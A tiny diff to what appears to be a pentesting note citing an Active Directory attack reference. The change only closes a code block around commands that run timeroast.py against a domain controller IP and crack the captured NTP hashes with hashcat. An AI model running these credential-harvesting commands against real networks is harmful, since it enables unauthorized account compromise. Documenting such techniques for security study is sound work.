@@ -35,3 +35,5 @@ Quote to https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-
 ```
 sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
 hashcat -m 31300 ntp-hashes.txt
+```
+
